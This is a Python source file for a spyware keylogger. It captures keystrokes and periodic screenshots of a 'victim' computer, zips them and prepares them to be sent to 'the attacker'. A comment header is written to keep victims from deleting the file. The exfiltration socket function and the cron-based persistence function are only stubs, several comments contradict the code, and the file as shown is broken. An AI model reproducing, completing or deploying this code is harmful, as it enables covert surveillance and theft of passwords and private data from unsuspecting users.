#!/usr/bin/env python3

'''
Name : Alexis Rodriguez
Date : 2020-02-09
THIS FILE IS IMPORTANT FOR SYSTEM PROCESSES... PLEASE DO NOT ERASE!!
'''

from pynput import keyboard
from zipfile import ZipFile
import pyautogui as pygrab
import threading
import socket
import sys, os, time
import subprocess



log = ''

def main():
	global log
	directory, to_append = make_get_dir(), 'log_' + make_name()
	save_screen()
	zipped = zip_folder(directory)
	socket_send(zipped)

	# start the keylogger
	with keyboard.Listener(
		on_press=on_press) as listener:
		log_to_file()
		listener.join()

'''
make directory in /tmp folder
'''
def make_get_dir():
	try:
		dir_to_create = "/tmp/folder/"
		os.mkdir(dir_to_create)
	except OSError:
		pass
	return dir_to_create

'''
Handles the action taken when a 
key is pressed.
'''
def on_press(key):
	global log
	try:
		log += str(key.char)
	# handling special characters
	except AttributeError:
		if key == key.space:
			log += ' '
		elif key == key.enter: log += '\n'
		elif key == key.backspace: log += ''
		elif key == key.ctrl: log += ' ctrl+'
		else:
			log += str(key)

'''
Logging to a file every 5 seconds
'''
def log_to_file():
	global log
	# open file
	f = open(make_get_dir() + 'log.txt', 'w')
	# write log to file
	f.write(log)
	# every 30 seconds invoke this function
	clock = threading.Timer(30, log_to_file)
	clock.start()

'''
get time image was taken append it to 
the name of the images file
'''
def make_name():
	seconds_since_epoch = time.time()
	date = time.ctime(seconds_since_epoch).split()
	return date[1] + '-' + date[2] + '-' + date[3]

'''
Take a screenshot of the victions computer
every minute and save it to /tmp/folder directory
'''
def save_screen():
	# take a screenshot
	image = pygrab.screenshot()
	# get time to append to image file name
	time = make_name()
	# save image to the directory that was created
	image.save(r'/tmp/folder/normal_' + time + '.png')
	# repeat function every two minutes
	take_screen = threading.Timer(120, save_screen)
	take_screen.start()

'''
Zip folder contents before sending as email
Param : directory of folder location
'''
def zip_folder(direc):
	# list to contain all path of files to zip
	file_paths = []
	zip_name = 'zipped_file.zip'

	for root, directories, files in os.walk(direc):
		for file in files:
			# joining absolute path with file name
			filepath = os.path.join(root, file)
			# append filepath to list containing all file paths
			file_paths.append(filepath)

	# creating zipped file
	with ZipFile(zip_name, 'w') as zipped:
		'''
		for every file in list of file paths
			add file to zip file
		'''
		for file in file_paths:
			zipped.write(file)

		return zipped

'''
send the zipped folder to the attacker
Param : zipped file created by zip_folder function
'''
def socket_send(zipped_file):
	# create server socket and send file to whoever connects



'''
Create cronjob to startup keylogger after reboot
'''
def create_cronjob():
	# use subprocess to create cronjob to start up keylogger
	# after restarting



if __name__ == '__main__':
	print('''
			PYTHON KEYLOGGER 2020
. -------------------------------------------------------------------.        
| [Esc] [F1][F2][F3][F4][F5][F6][F7][F8][F9][F0][F10][F11][F12] o o o|        
|                                                                    |        
| [`][1][2][3][4][5][6][7][8][9][0][-][=][_<_] [I][H][U] [N][/][*][-]|        
| [|-][Q][W][E][R][T][Y][U][I][O][P][{][}] | | [D][E][D] [7][8][9]|+||        
| [CAP][A][S][D][F][G][H][J][K][L][;]['][#]|_|           [4][5][6]|_||        
| [^][\\][Z][X][C][V][B][N][M][,][.][/] [__^__]    [^]    [1][2][3]| ||        
| [c]   [a][________________________][a]   [c] [<][V][>] [ 0  ][.]|_||        
`--------------------------------------------------------------------'        
	''')
	main()
